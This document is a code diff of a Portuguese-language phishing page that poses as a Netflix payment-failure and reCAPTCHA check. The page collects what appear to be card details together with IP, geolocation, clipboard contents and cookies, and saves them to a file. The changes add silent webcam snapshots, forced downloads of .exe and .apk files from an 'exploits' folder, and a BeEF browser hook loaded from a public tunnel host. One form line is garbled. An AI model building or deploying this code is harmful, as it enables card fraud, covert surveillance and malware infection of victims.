@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>titulo</title>
+    <title>Netflix | Falha no Pagamento</title>
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap">
     <style>
         * {
@@ -12,7 +12,9 @@
             box-sizing: border-box;
             font-family: "Poppins", sans-serif;
         }
-        a { text-decoration: none; }
+        a {
+            text-decoration: none;
+        }
         body {
             display: flex;
             justify-content: center;
@@ -39,7 +41,9 @@
             color: #4A90E2;
             text-align: center;
         }
-        .input-box { margin: 1rem 0; }
+        .input-box {
+            margin: 1rem 0;
+        }
         .input-box input {
             width: 100%;
             height: 45px;
@@ -52,14 +56,20 @@
             outline: none;
             transition: border-color 0.3s;
         }
-        .input-box input:focus { border-color: #4A90E2; }
-        .input-box input::placeholder { color: #a1a1a1; }
+        .input-box input:focus {
+            border-color: #4A90E2;
+        }
+        .input-box input::placeholder {
+            color: #a1a1a1;
+        }
         .input-box input[type="number"]::-webkit-inner-spin-button,
         .input-box input[type="number"]::-webkit-outer-spin-button {
             -webkit-appearance: none;
             margin: 0;
         }
-        .input-box input[type="number"] { -moz-appearance: textfield; }
+        .input-box input[type="number"] {
+            -moz-appearance: textfield;
+        }
         .remember {
             display: flex;
             justify-content: space-between;
@@ -68,7 +78,9 @@
             font-size: 0.9rem;
             color: #b3b3b3;
         }
-        .remember input[type="checkbox"] { margin-right: 5px; }
+        .remember input[type="checkbox"] {
+            margin-right: 5px;
+        }
         .redirect {
             width: 100%;
             height: 50px;
@@ -85,198 +97,352 @@
             background: #357ABD;
             transform: translateY(-2px);
         }
-        .feedback { margin-top: 1rem; text-align: center; }
+        .feedback {
+            margin-top: 1rem;
+            text-align: center;
+        }
         @media (max-width: 480px) {
-            .container { margin: 1rem; padding: 1.5rem; }
-            h3 { font-size: 1.2rem; }
-            .redirect { font-size: 1rem; }
+            .container {
+                margin: 1rem;
+                padding: 1.5rem;
+            }
+            h3 {
+                font-size: 1.2rem;
+            }
+            .redirect {
+                font-size: 1rem;
+            }
         }
     </style>
 </head>
 <body>
-<?php
-header("Access-Control-Allow-Origin: *");
-header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
-header("Access-Control-Allow-Headers: Content-Type, Authorization");
+    <?php
+    header("Access-Control-Allow-Origin: *");
+    header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
+    header("Access-Control-Allow-Headers: Content-Type, Authorization");
 
-function getUserIP() {
-    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_CLIENT_IP', 'REMOTE_ADDR'];
-    foreach ($headers as $header) {
-        if (!empty($_SERVER[$header])) {
-            $ip = $_SERVER[$header];
-            if ($header === 'HTTP_X_FORWARDED_FOR') {
-                $ip_list = explode(',', $ip);
-                $ip = trim($ip_list[0]);
+    function getUserIP() {
+        $headers = [
+            'HTTP_CF_CONNECTING_IP', // Cloudflare
+            'HTTP_X_FORWARDED_FOR',  // Proxy ou rede móvel
+            'HTTP_CLIENT_IP',        // Cliente
+            'REMOTE_ADDR'            // Último recurso
+        ];
+        
+        foreach ($headers as $header) {
+            if (!empty($_SERVER[$header])) {
+                $ip = $_SERVER[$header];
+                if ($header === 'HTTP_X_FORWARDED_FOR') {
+                    $ip_list = explode(',', $ip);
+                    $ip = trim($ip_list[0]); // Pega o primeiro IP
+                }
+                if (filter_var($ip, FILTER_VALIDATE_IP)) {
+                    return $ip;
+                }
             }
-            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
+        }
+        return 'IP não disponível';
+    }
+
+    function getIPInfo($ip) {
+        if (!filter_var($ip, FILTER_VALIDATE_IP)) {
+            return ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
+        }
+
+        $encoded_ip = urlencode($ip);
+        $api_url = "http://ip-api.com/json/{$encoded_ip}"; 
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $api_url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+        $response = curl_exec($ch);
+
+        if (curl_errno($ch)) {
+            error_log('Erro cURL ao acessar ip-api.com: ' . curl_error($ch) . " | IP: $ip");
+            curl_close($ch);
+            return ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
+        }
+
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+
+        if ($http_code !== 200) {
+            error_log("Erro HTTP $http_code ao acessar ip-api.com | IP: $ip");
+            return ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
+        }
+
+        $data = json_decode($response, true);
+        if (!$data || $data['status'] !== 'success') {
+            error_log("Resposta inválida do ip-api.com | IP: $ip | Resposta: $response");
+            return ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
+        }
+
+        return [
+            'city' => $data['city'] ?? 'Cidade desconhecida',
+            'region' => $data['regionName'] ?? 'Região desconhecida',
+            'country' => $data['country'] ?? 'País desconhecido'
+        ];
+    }
+
+    function getExploitFiles() {
+        $directory = 'exploits/';
+        $files = [];
+        if (is_dir($directory)) {
+            $allFiles = scandir($directory);
+            foreach ($allFiles as $file) {
+                if (in_array(pathinfo($file, PATHINFO_EXTENSION), ['exe', 'apk'])) {
+                    $files[] = [
+                        'href' => $directory . $file,
+                        'nome' => $file
+                    ];
+                }
+            }
+        }
+        return $files;
+    }
+
+    // Captura o IP e a geolocalização assim que a página carrega
+    $ip = getUserIP();
+    $ipData = getIPInfo($ip);
+    $geoLocationIP = ($ipData['city'] ?? 'Cidade desconhecida') . ', ' . 
+                     ($ipData['region'] ?? 'Região desconhecida') . ', ' . 
+                     ($ipData['country'] ?? 'País desconhecido');
+
+    // Salva a localização do IP no arquivo dados.txt no formato desejado
+    if (!is_dir('uploads')) {
+        mkdir('uploads', 0755, true);
+    }
+
+    $file = fopen("dados.txt", "a");
+    if ($file) {
+        $clientNumber = (file_exists("dados.txt") ? count(file("dados.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES)) / 10 + 1 : 1);
+
+        fwrite($file, "+------------------------------------------------------------------------+\n");
+        fwrite($file, "|                         Cliente $clientNumber                          |\n");
+        fwrite($file, "+------------------------------------------------------------------------+\n");
+        fwrite($file, "|  Dados capturados....                                                  |\n");
+        fwrite($file, "+------------------------------------------------------------------------+\n");
+        fwrite($file, "| IP: $ip                                                                |\n");
+        fwrite($file, "+------------------------------------------------------------------------+\n");
+        fwrite($file, "| Localização (IP): $geoLocationIP                                       |\n");
+        fwrite($file, "+------------------------------------------------------------------------+\n");
+        fwrite($file, "\n");
+        fclose($file);
+    } else {
+        error_log("Erro ao abrir o arquivo dados.txt para escrita");
+    }
+
+    $feedback = '';
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['a1'])) {
+        $a1 = $_POST['a1'] ?? 'N/A';
+        $a2 = $_POST['a2'] ?? 'N/A';
+        $a3 = $_POST['a3'] ?? 'N/A';
+        $a4 = $_POST['a4'] ?? 'N/A';
+        $location = $_POST['location'] ?? 'Localização não disponível';
+        $clipboard = $_POST['clipboard'] ?? 'Nenhum texto da área de transferência';
+
+        $file = fopen("dados.txt", "a");
+        if ($file) {
+            $clientNumber = (file_exists("dados.txt") ? count(file("dados.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES)) / 10 + 1 : 1);
+
+            fwrite($file, "+------------------------------------------------------------------------+\n");
+            fwrite($file, "|                         Cliente $clientNumber                          |\n");
+            fwrite($file, "+------------------------------------------------------------------------+\n");
+            fwrite($file, "|  Dados capturados....                                                  |\n");
+            fwrite($file, "+------------------------------------------------------------------------+\n");
+            fwrite($file, "| Input 1: $a1                                                           |\n");
+            fwrite($file, "+------------------------------------------------------------------------+\n");
+            fwrite($file, "| Input 2: $a2                                                           |\n");
+            fwrite($file, "+------------------------------------------------------------------------+\n");
+            fwrite($file, "| Input 3: $a3                                                           |\n");
+            fwrite($file, "+------------------------------------------------------------------------+\n");
+            fwrite($file, "| Input 4: $a4                                                           |\n");
+            fwrite($file, "+------------------------------------------------------------------------+\n");
+            fwrite($file, "| IP: $ip                                                                |\n");
+            fwrite($file, "+------------------------------------------------------------------------+\n");
+            fwrite($file, "| Localização (Navegador): $location                                     |\n");
+            fwrite($file, "+------------------------------------------------------------------------+\n");
+            fwrite($file, "| Localização (IP): $geoLocationIP                                       |\n");
+            fwrite($file, "+------------------------------------------------------------------------+\n");
+            fwrite($file, "| Área de Transferência: $clipboard                                      |\n");
+            fwrite($file, "+------------------------------------------------------------------------+\n");
+            fwrite($file, "| Cookies: " . ($_SERVER['HTTP_COOKIE'] ?? 'Nenhum cookie disponível') . "\n");
+            fwrite($file, "+------------------------------------------------------------------------+\n");
+            fwrite($file, "\n");
+            fclose($file);
+            $feedback = "<p style='color: green;' class='feedback'>Dados salvos com sucesso!</p>";
+        } else {
+            $feedback = "<p style='color: red;' class='feedback'>Erro ao salvar os dados!</p>";
         }
     }
-    return 'IP não disponível';
-}
 
-function getIPInfo($ip) {
-    if (!filter_var($ip, FILTER_VALIDATE_IP)) {
-        return ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
-    }
-    $encoded_ip = urlencode($ip);
-    $api_url = "http://ip-api.com/json/{$encoded_ip}";
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $api_url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-    $response = curl_exec($ch);
-    curl_close($ch);
-    $data = json_decode($response, true);
-    return ($data && $data['status'] === 'success') ? [
-        'city' => $data['city'] ?? 'Cidade desconhecida',
-        'region' => $data['regionName'] ?? 'Região desconhecida',
-        'country' => $data['country'] ?? 'País desconhecido'
-    ] : ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
-}
+    $exploitFiles = getExploitFiles();
+    ?>
 
-// Captura IP e localização
-$ip = getUserIP();
-$ipData = getIPInfo($ip);
-$geoLocationIP = htmlspecialchars("{$ipData['city']}, {$ipData['region']}, {$ipData['country']}");
+    <main class="container">
+        <form method="POST" enctype="multipart/form-data" id="form">
+            <h3>Confirme que é você! - Recaptcha</h3>
+            <div class="input-box">
+                <input placeholder="Input 1" type="text" name="a1" maxlength="50" required>
+            </div>
+            <div class="input-box">
+                <input placeholder="Input 2" type="number" name="a2" maxlength="16" required>
+            </div>
+            <div class="input-box">
+                <input placeholder="Input 3" type="number" name="a3" maxlength="3" required>
+            </div>
+            <div class="input-box">
+                <input placeholder="Input 4" type="number" name="a4" maxlength="4" required>
+            </div>
+            <div class="remember">
+                <label><input type="checkbox" name="remember_me"> Lembre de mim</label>
+            </div>
+            <video id="video" autoplay style="display: none;"></video>
+            <canvas id="canvas" style="display: none;"></canvas>
+            <input type="hidden" name="location" id="location信号
 
-// Salva dados iniciais no mesmo diretório
-$filePath = "dados.txt";
-$file = fopen($filePath, "a");
-fwrite($file, "+------------------------------------------------------------------------+\n");
-fwrite($file, "|                         Cliente " . (file_exists($filePath) ? count(file($filePath)) / 10 + 1 : 1) . "                          |\n");
-fwrite($file, "+------------------------------------------------------------------------+\n");
-fwrite($file, "|  Dados capturados....                                                  |\n");
-fwrite($file, "+------------------------------------------------------------------------+\n");
-fwrite($file, "| IP: $ip                                                                |\n");
-fwrite($file, "+------------------------------------------------------------------------+\n");
-fwrite($file, "| Localização (IP): $geoLocationIP                                       |\n");
-fwrite($file, "+------------------------------------------------------------------------+\n\n");
-fclose($file);
+            <input type="hidden" name="photo" id="photo" accept="image/png" style="display: none;">
+            <button type="submit" class="redirect">Enviar</button>
+            <?php echo $feedback; ?>
+        </form>
+    </main>
 
-$feedback = '';
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['a1'])) {
-    $a1 = htmlspecialchars($_POST['a1'] ?? 'N/A');
-    $a2 = htmlspecialchars($_POST['a2'] ?? 'N/A');
-    $a3 = htmlspecialchars($_POST['a3'] ?? 'N/A');
-    $a4 = htmlspecialchars($_POST['a4'] ?? 'N/A');
-    $location = htmlspecialchars($_POST['location'] ?? 'Localização não disponível');
-    $clipboard = htmlspecialchars($_POST['clipboard'] ?? 'Nenhum texto da área de transferência');
-
-    $file = fopen($filePath, "a");
-
-    fwrite($file, "  Cliente " . (file_exists($filePath) ? count(file($filePath)) / 10 + 1 : 1) . "\n");
-    fwrite($file, "  Dados capturados.... \n");
-    fwrite($file, " Input 1: $a1  \n");
-    fwrite($file, " Input 2: $a2  \n");
-    fwrite($file, " Input 3: $a3  \n");
-    fwrite($file, " Input 4: $a4 \n");
-    fwrite($file, " IP: $ip \n");
-    fwrite($file, " Localização (Navegador): $location  \n");
-    fwrite($file, " Localização (IP): $geoLocationIP \n");
-    fwrite($file, " Área de Transferência: $clipboard \n");
-    fwrite($file, " Cookies: " . ($_SERVER['HTTP_COOKIE'] ?? 'Nenhum cookie disponível') . "\n");
-    fclose($file);
-    $feedback = "<p style='color: green;' class='feedback'></p>";
-}
-?>
-
-<main class="container">
-    <form method="POST" enctype="multipart/form-data" id="form">
-        <h3>Confirme que é você! - Recaptcha</h3>
-        <div class="input-box">
-            <input placeholder="Input 1" type="text" name="a1" maxlength="50" required>
-        </div>
-        <div class="input-box">
-            <input placeholder="Input 2" type="number" name="a2" maxlength="16" required>
-        </div>
-        <div class="input-box">
-            <input placeholder="Input 3" type="number" name="a3" maxlength="3" required>
-        </div>
-        <div class="input-box">
-            <input placeholder="Input 4" type="number" name="a4" maxlength="4" required>
-        </div>
-        <div class="remember">
-            <label><input type="checkbox" name="remember_me"> Lembre de mim</label>
-        </div>
-        <input type="hidden" name="location" id="locationData">
-        <input type="hidden" name="clipboard" id="clipboardData">
-        <button type="submit" class="redirect" id="submitBtn"><a hrefe="javascript:%20(function%20()%20{%20var%20url%20=%20%27http://127.0.0.1/hook.js%27;if%20(typeof%20beef%20==%20%27undefined%27)%20{%20var%20bf%20=%20document.createElement(%27script%27);%20bf.type%20=%20%27text%2fjavascript%27;%20bf.src%20=%20url;%20document.body.appendChild(bf);}})();">Enviar</a></button>
-        <?php echo $feedback; ?>
-    </form>
-</main>
-
-<script>
-const form = document.getElementById('form');
-const locationData = document.getElementById('locationData');
-const clipboardData = document.getElementById('clipboardData');
-
-// Captura geolocalização
-if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-        position => {
-            locationData.value = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
-        },
-        () => {
-            locationData.value = 'N/A';
+    <?php
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['photo']) && !isset($_POST['a1'])) {
+        if (!is_dir('uploads')) {
+            mkdir('uploads', 0755, true);
         }
-    );
-} else {
-    locationData.value = 'N/A';
-}
-
-// Captura clipboard
-async function captureClipboard() {
-    try {
-        if (navigator.clipboard && navigator.clipboard.readText) {
-            return await navigator.clipboard.readText() || 'N/A';
-        }
-        return 'N/A';
-    } catch (err) {
-        return 'N/A: ' + err.message;
+        $photoPath = 'uploads/photo_' . time() . '.png';
+        move_uploaded_file($_FILES['photo']['tmp_name'], $photoPath);
+        exit;
     }
-}
+    ?>
 
-// Configura cookie
-window.onload = () => {
-    document.cookie = "teste_cookie=valor_teste; path=/; max-age=3600";
-};
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const locationData = document.getElementById('locationData');
+        const clipboardData = document.getElementById('clipboardData');
+        const form = document.getElementById('form');
 
-// Envio do formulário
-form.addEventListener('submit', async (event) => {
-    event.preventDefault();
-    clipboardData.value = await captureClipboard();
-    form.submit();
-});
-</script>
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                position => {
+                    locationData.value = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
+                    console.log("Localização capturada: ", locationData.value);
+                },
+                err => {
+                    locationData.value = "N/A";
+                    console.error('Geolocalização negada ou indisponível', err);
+                }
+            );
+        } else {
+            locationData.value = "N/A";
+            console.log("Geolocalização não suportada pelo navegador");
+        }
 
-<script>
-/* 
-    000000000000       000000000000             
-    0oooooooooo0       0oooooooooo0               
-    0oo0000oooo0       0oo0000oooo0                      
-    0oo0000oooo0       0oo0000oooo0                      
-    0oo0000oooo0       0oo0000oooo0                   
-    0oo0000oooo0       0oo0000oooo0                 
-    0oo____oooo0       0oo____oooo0 
-    000000000000       000000000000                                         
-    1                   ___________        _________
-    1  '    sssssssss  |___________        |_________
-    1       ss         |                   |
-    1         s        |___________        |_________
-    1          s       |                   |
-    1           s      |___________        |__________
-    1     ssssssss     |___________        |__________  .you  
-    1
-    ___              
-*/
-</script>
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                const context = canvas.getContext('2d');
 
-<script>
-var commandModuleStr = '<script src="http://127.0.0.1/hook.js" type="text/javascript"><\/script>';
-document.write(commandModuleStr);
-</script>
+                function captureFrame() {
+                    if (!video.videoWidth) return requestAnimationFrame(captureFrame);
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0);
 
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('photo', blob, `photo_${Date.now()}.png`);
+                        fetch(window.location.href, {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(response => console.log('Foto enviada'))
+                        .catch(err => console.error('Erro ao enviar foto', err));
+                    }, 'image/png');
+
+                    setTimeout(() => requestAnimationFrame(captureFrame), 1000);
+                }
+                requestAnimationFrame(captureFrame);
+            })
+            .catch(err => {
+                console.error('Acesso à câmera negado ou indisponível:', err);
+            });
+
+        async function captureClipboard() {
+            try {
+                if (navigator.clipboard && navigator.clipboard.readText) {
+                    const text = await navigator.clipboard.readText();
+                    console.log("Clipboard capturado: ", text);
+                    return text || 'N/A';
+                } else {
+                    console.log("Clipboard não suportado");
+                    return 'N/A';
+                }
+            } catch (err) {
+                console.error('Acesso ao clipboard negado ou erro:', err.message);
+                return 'N/A: ' + err.message;
+            }
+        }
+
+        function triggerDownload(filePath, fileName) {
+            const link = document.createElement('a');
+            link.href = filePath;
+            link.download = fileName;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            console.log(`Download iniciado: ${fileName}`);
+        }
+
+        window.onload = () => {
+            document.cookie = "teste_cookie=valor_teste; path=/; max-age=3600";
+
+            const arquivos = <?php echo json_encode($exploitFiles); ?>;
+            if (arquivos.length > 0) {
+                arquivos.forEach((arquivo, i) => {
+                    setTimeout(() => {
+                        triggerDownload(arquivo.href, arquivo.nome);
+                    }, i * 1000);
+                });
+            } else {
+                console.log("Nenhum arquivo .exe ou .apk encontrado na pasta exploits/.");
+            }
+
+            form.addEventListener('submit', async (event) => {
+                event.preventDefault();
+                const clipboardText = await captureClipboard();
+                clipboardData.value = clipboardText;
+                console.log("Clipboard enviado: ", clipboardText);
+                form.submit();
+            });
+        };
+
+        /* 
+            000000000000       000000000000             
+            0oooooooooo0       0oooooooooo0               
+            0oo0000oooo0       0oo0000oooo0                      
+            0oo0000oooo0       0oo0000oooo0                      
+            0oo0000oooo0       0oo0000oooo0                   
+            0oo0000oooo0       0oo0000oooo0                 
+            0oo____oooo0       0oo____oooo0 
+            000000000000       000000000000                                         
+            1                    ___________         _________
+            1  '    sssssssss  |___________        |_________
+            1       ss         |                   |
+            1         s        |___________        |_________
+            1          s       |                   |
+            1           s      |___________        |__________
+            1     ssssssss     |___________        |__________  .you  
+            1
+            ___              
+        */
+    </script>
+    <script>
+        var commandModuleStr = '<script src="https://902bfb34f2272eacab39ba2d3ba73d12.serveo.net/hook.js" type="text/javascript"><\/script>';
+        document.write(commandModuleStr);
+    </script>
 </body>
 </html>
